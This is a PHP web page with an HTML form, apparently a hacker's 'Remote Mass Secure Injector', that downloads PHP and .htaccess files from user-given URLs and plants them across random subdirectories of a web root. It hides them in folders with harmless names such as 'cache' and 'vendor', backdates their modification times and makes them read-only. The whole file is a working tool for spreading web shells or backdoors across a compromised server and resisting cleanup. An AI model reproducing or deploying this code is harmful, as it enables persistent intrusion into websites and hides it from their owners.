<?php
// error_reporting(0); // Aktifkan di production untuk menyembunyikan error

$successLog = [];
$errorLog = [];
$showResults = false;
$totalFolders = 0;
$processedCount = 0;

// Daftar nama folder yang telah ditentukan
$folderNameList = [
    'assets', 'cache', 'lib', 'includes', 'tmp', 'static', 'content', 'vendor'
];

function generateRandomFolderName($list) {
    static $used = [];
    $available = array_diff($list, $used);
    if (empty($available)) return null;
    $next = array_shift($available);
    $used[] = $next;
    return $next;
}

function collectAllFolders($dir, &$allDirs) {
    if (!is_readable($dir)) return;
    $items = @scandir($dir);
    if ($items === false) return;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path) && is_readable($path)) {
            $allDirs[] = $path;
            collectAllFolders($path, $allDirs);
        }
    }
}

function sanitizePath($path) {
    return rtrim(str_replace(['../', '..\\'], '', $path), '/\\');
}

// MODIFIED: Logic now handles remote URLs instead of file uploads
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $showResults = true;
    $targetPath = sanitizePath($_POST['target_path'] ?? '');
    $maxFolders = max(1, min(50, (int) ($_POST['folder_limit'] ?? 5)));

    // Get remote URLs and filename from POST
    $htaccessUrl = trim($_POST['htaccess_url'] ?? '');
    $phpUrl = trim($_POST['php_url'] ?? '');
    $phpOriginalName = basename(trim($_POST['php_filename'] ?? '')); // Use basename for security

    if (empty($targetPath)) {
        $errorLog[] = "❌ Target directory path is required";
    } elseif (!is_dir($targetPath)) {
        $errorLog[] = "❌ Target directory not found: <code>" . htmlspecialchars($targetPath) . "</code>";
    } elseif (!is_readable($targetPath)) {
        $errorLog[] = "❌ Target directory is not readable: <code>" . htmlspecialchars($targetPath) . "</code>";
    } elseif (!empty($htaccessUrl) && !empty($phpUrl) && !empty($phpOriginalName)) {
        // Fetch content from URLs
        $htaccessContent = @file_get_contents($htaccessUrl);
        $phpContent = @file_get_contents($phpUrl);

        if ($htaccessContent === false) {
            $errorLog[] = "❌ Failed to fetch .htaccess content from URL: <code>" . htmlspecialchars($htaccessUrl) . "</code>";
        } elseif ($phpContent === false) {
            $errorLog[] = "❌ Failed to fetch PHP content from URL: <code>" . htmlspecialchars($phpUrl) . "</code>";
        } elseif (strlen($htaccessContent) > 50000 || strlen($phpContent) > 500000) { // Size limit check
            $errorLog[] = "❌ Remote file content is too large.";
        } else {
            $allDirs = [];
            collectAllFolders($targetPath, $allDirs);

            if (empty($allDirs)) {
                $errorLog[] = "❌ No subdirectories found in target path";
            } else {
                shuffle($allDirs);
                $selectedDirs = array_slice($allDirs, 0, $maxFolders);
                $setTimeRaw = trim($_POST['set_time'] ?? '');
                $mtime = $setTimeRaw ? strtotime($setTimeRaw) : time(); // Default to current time if empty

                foreach ($selectedDirs as $dir) {
                    $totalFolders++;
                    $randomFolderName = generateRandomFolderName($folderNameList);
                    if ($randomFolderName === null) {
                        $errorLog[] = "❌ Ran out of unique folder names from the list.";
                        break;
                    }

                    $randomFolder = $dir . '/' . $randomFolderName;
                    if (!is_dir($randomFolder)) {
                        if (!@mkdir($randomFolder, 0755, true)) {
                            $errorLog[] = "❌ Failed to create subfolder: <code>" . htmlspecialchars($randomFolder) . "</code>";
                            continue;
                        }
                        $successLog[] = "📁 Created subfolder: <code>" . htmlspecialchars($randomFolder) . "</code>";
                    }

                    $htaccessPath = $randomFolder . '/.htaccess';
                    $phpPath = $randomFolder . '/' . $phpOriginalName;

                    // Write .htaccess
                    if (@file_put_contents($htaccessPath, $htaccessContent) !== false) {
                        @touch($htaccessPath, $mtime);
                        if (@chmod($htaccessPath, 0444)) {
                            $successLog[] = "✅ Deployed .htaccess to: <code>" . htmlspecialchars($htaccessPath) . "</code> (chmod 0444)";
                        } else {
                             $errorLog[] = "⚠️ Failed to chmod .htaccess: <code>" . htmlspecialchars($htaccessPath) . "</code>";
                        }
                    } else {
                        $errorLog[] = "❌ Failed to deploy .htaccess to: <code>" . htmlspecialchars($htaccessPath) . "</code>";
                    }

                    // Write PHP file
                    if (@file_put_contents($phpPath, $phpContent) !== false) {
                        @touch($phpPath, $mtime);
                         if (@chmod($phpPath, 0444)) {
                            $successLog[] = "✅ Deployed PHP file to: <code>" . htmlspecialchars($phpPath) . "</code> (chmod 0444)";
                        } else {
                            $errorLog[] = "⚠️ Failed to chmod PHP file: <code>" . htmlspecialchars($phpPath) . "</code>";
                        }
                    } else {
                        $errorLog[] = "❌ Failed to deploy PHP file to: <code>" . htmlspecialchars($phpPath) . "</code>";
                    }
                    
                    // Secure the parent folder (optional, can be noisy)
                    if (@chmod($randomFolder, 0555)) { // Changed to 0555 to allow directory listing
                        $successLog[] = "🔒 Secured subfolder: <code>" . htmlspecialchars($randomFolder) . "</code> (chmod 0555)";
                    }

                    $processedCount++;
                }
            }
        }
    } else {
        $errorLog[] = "❌ All URL and filename fields are required.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 Remote Mass Secure Injector</title>
    <style>
        /* CSS styles are the same, no changes needed here */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%); color: #00ff41; min-height: 100vh; padding: 20px; line-height: 1.6; }
        .container { max-width: 1200px; margin: 0 auto; background: rgba(0, 0, 0, 0.8); border: 2px solid #00ff41; border-radius: 10px; padding: 30px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); }
        .header { text-align: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 2px solid #00ff41; }
        .header h1 { font-size: 2.5rem; text-shadow: 0 0 10px #00ff41; margin-bottom: 10px; }
        .header p { color: #888; font-size: 1.1rem; }
        .form-section { background: rgba(0, 20, 0, 0.5); padding: 25px; border-radius: 8px; border: 1px solid #004400; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: bold; color: #00ff41; font-size: 1.1rem; }
        .form-group input[type="text"], .form-group input[type="number"] { width: 100%; padding: 12px; background: #000; border: 2px solid #333; border-radius: 5px; color: #00ff41; font-family: 'Courier New', monospace; font-size: 1rem; transition: all 0.3s ease; }
        .form-group input:focus { outline: none; border-color: #00ff41; box-shadow: 0 0 10px rgba(0, 255, 65, 0.3); }
        .upload-btn { width: 100%; padding: 15px; background: linear-gradient(45deg, #00ff41, #00cc33); color: #000; border: none; border-radius: 8px; font-size: 1.2rem; font-weight: bold; cursor: pointer; transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px; }
        .upload-btn:hover { background: linear-gradient(45deg, #00cc33, #009922); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 65, 0.4); }
        .results-section { margin-top: 30px; }
        .log-container { background: rgba(0, 0, 0, 0.7); border-radius: 8px; margin-bottom: 20px; overflow: hidden; border: 1px solid #333; }
        .log-header { padding: 15px; font-weight: bold; font-size: 1.2rem; border-bottom: 1px solid #333; }
        .success-header { background: rgba(0, 255, 65, 0.1); color: #00ff41; }
        .error-header { background: rgba(255, 51, 51, 0.1); color: #ff3333; }
        .summary-header { background: rgba(0, 150, 255, 0.1); color: #0096ff; }
        .log-content { padding: 15px; max-height: 300px; overflow-y: auto; }
        .log-entry { padding: 8px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.1); font-size: 0.95rem; word-break: break-all; }
        .log-entry:last-child { border-bottom: none; }
        code { background: rgba(255, 255, 255, 0.1); padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
        .stat-card { background: rgba(0, 0, 0, 0.5); padding: 20px; border-radius: 8px; border: 1px solid #333; text-align: center; }
        .stat-number { font-size: 2rem; font-weight: bold; color: #00ff41; display: block; }
        .stat-label { color: #888; margin-top: 5px; }
        .loading { display: none; text-align: center; margin: 20px 0; }
        .spinner { border: 4px solid rgba(0, 255, 65, 0.3); border-radius: 50%; border-top: 4px solid #00ff41; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .file-info { font-size: 0.9rem; color: #888; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Remote Mass Secure Injector</h1>
            <p>Deploy files from URLs into random subdirectories by Senyum Gan</p>
        </div>
        <form method="POST" id="uploadForm">
            <div class="form-section">
                <div class="form-group">
                    <label for="target_path">🎯 Target Directory Path</label>
                    <input type="text" id="target_path" name="target_path" required placeholder="/var/www/html or /home/user/public_html" value="<?= htmlspecialchars($_POST['target_path'] ?? '') ?>">
                    <div class="file-info">Root directory for deployment.</div>
                </div>
                <div class="form-group">
                    <label for="folder_limit">📦 Maximum Folders to Process</label>
                    <input type="number" id="folder_limit" name="folder_limit" min="1" max="50" value="<?= htmlspecialchars($_POST['folder_limit'] ?? '5') ?>" required>
                    <div class="file-info">Limit: 1-50 folders for safety.</div>
                </div>

                <div class="form-group">
                    <label for="htaccess_url">📄 .htaccess File URL</label>
                    <input type="text" id="htaccess_url" name="htaccess_url" required placeholder="https://example.com/raw/htaccess.txt" value="<?= htmlspecialchars($_POST['htaccess_url'] ?? '') ?>">
                    <div class="file-info">Direct link to the raw .htaccess content.</div>
                </div>
                <div class="form-group">
                    <label for="php_url">🧩 PHP File URL</label>
                    <input type="text" id="php_url" name="php_url" required placeholder="https://example.com/raw/script.php" value="<?= htmlspecialchars($_POST['php_url'] ?? '') ?>">
                    <div class="file-info">Direct link to the raw PHP script content.</div>
                </div>
                <div class="form-group">
                    <label for="php_filename">📝 Desired PHP Filename</label>
                    <input type="text" id="php_filename" name="php_filename" required placeholder="index.php" value="<?= htmlspecialchars($_POST['php_filename'] ?? '') ?>">
                    <div class="file-info">The name for the PHP file when saved.</div>
                </div>

                <div class="form-group">
                    <label for="set_time">⏰ Set File Modification Time (optional)</label>
                    <input type="text" id="set_time" name="set_time" placeholder="YYYY-MM-DD HH:MM:SS" value="<?= htmlspecialchars($_POST['set_time'] ?? '') ?>">
                    <div class="file-info">Leave blank to use current server time.</div>
                </div>
                <button type="submit" class="upload-btn" id="submitBtn">
                    🚀 Start Remote Deployment
                </button>
            </div>
        </form>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Processing deployment...</p>
        </div>
        <?php if ($showResults): ?>
        <div class="results-section">
            <?php if (!empty($successLog)): ?>
            <div class="log-container">
                <div class="log-header success-header">✅ Success Log (<?= count($successLog) ?> entries)</div>
                <div class="log-content">
                    <?php foreach ($successLog as $log): ?>
                        <div class="log-entry"><?= $log ?></div>
                    <?php endforeach; ?>
                </div>
            </div>
            <?php endif; ?>
            <?php if (!empty($errorLog)): ?>
            <div class="log-container">
                <div class="log-header error-header">❌ Error Log (<?= count($errorLog) ?> entries)</div>
                <div class="log-content">
                    <?php foreach ($errorLog as $log): ?>
                        <div class="log-entry"><?= $log ?></div>
                    <?php endforeach; ?>
                </div>
            </div>
            <?php endif; ?>
            <div class="log-container">
                <div class="log-header summary-header">📊 Deployment Summary</div>
                <div class="stats">
                    <div class="stat-card">
                        <span class="stat-number"><?= isset($allDirs) ? count($allDirs) : 0 ?></span>
                        <div class="stat-label">Total Folders Found</div>
                    </div>
                    <div class="stat-card">
                        <span class="stat-number"><?= $processedCount ?></span>
                        <div class="stat-label">Folders Processed</div>
                    </div>
                    <div class="stat-card">
                        <span class="stat-number"><?= count($successLog) ?></span>
                        <div class="stat-label">Successful Operations</div>
                    </div>
                    <div class="stat-card">
                        <span class="stat-number"><?= count($errorLog) ?></span>
                        <div class="stat-label">Failed Operations</div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>
    </div>
    <script>
        // MODIFIED: Simplified JavaScript for URL inputs
        document.getElementById('uploadForm').addEventListener('submit', function(e) {
            const targetPath = document.getElementById('target_path').value.trim();
            const htaccessUrl = document.getElementById('htaccess_url').value.trim();
            const phpUrl = document.getElementById('php_url').value.trim();
            const phpFilename = document.getElementById('php_filename').value.trim();

            if (!targetPath || !htaccessUrl || !phpUrl || !phpFilename) {
                // The 'required' attribute on inputs should prevent this, but it's a good fallback.
                alert('Please fill out all required fields.');
                e.preventDefault();
                return;
            }

            // Show loading indicator
            document.getElementById('loading').style.display = 'block';
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').innerHTML = '⏳ Processing...';
        });

        <?php if ($showResults): ?>
        // Auto-scroll to results after page load
        document.addEventListener('DOMContentLoaded', function() {
            const resultsSection = document.querySelector('.results-section');
            if (resultsSection) {
                resultsSection.scrollIntoView({ behavior: 'smooth' });
            }
        });
        <?php endif; ?>
    </script>
</body>
</html>
